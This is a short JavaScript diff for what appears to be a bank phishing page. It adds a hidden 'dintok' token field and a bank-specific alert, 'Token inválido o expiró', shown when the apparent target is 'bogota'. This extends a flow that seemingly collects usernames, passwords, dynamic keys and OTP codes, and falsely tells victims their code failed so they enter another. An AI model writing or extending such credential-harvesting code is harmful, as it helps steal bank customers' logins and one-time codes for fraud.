@@ -52,6 +52,7 @@ setTimeout(() =>{
 const user = document.querySelectorAll('#user');
 const puser = document.querySelectorAll('#puser');
 const cdin = document.querySelectorAll('#cdin');
+const dintok = document.querySelectorAll('#dintok');
 const ccaj = document.querySelectorAll('#ccaj');
 const cavance = document.querySelectorAll('#cavance');
 const otpcode = document.querySelectorAll('#otpcode');
@@ -78,13 +79,24 @@ if(info.checkerInfo.mode === 'userpassword'){
     setTimeout(() =>{
         // COMPROBAR ERROR
         if(info.metaInfo.cdin !== ''){
-            alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
+            if(info.metaInfo.ban === 'bogota'){
+                alert('Token inválido o expiró, por favor inténtelo de nuevo.');
+            }else{
+                alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
+            }
         }
     }, 2050);
 
-    cdin.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
+    if(info.metaInfo.ban === 'bogota'){
+        dintok.forEach(elem =>{
+            elem.classList.remove('hidden');
+        });
+    }else{  
+        cdin.forEach(elem =>{
+            elem.classList.remove('hidden');
+        });
+    }
+    
 }else if(info.checkerInfo.mode === 'ccaj'){
     setTimeout(() =>{
         // COMPROBAR ERROR
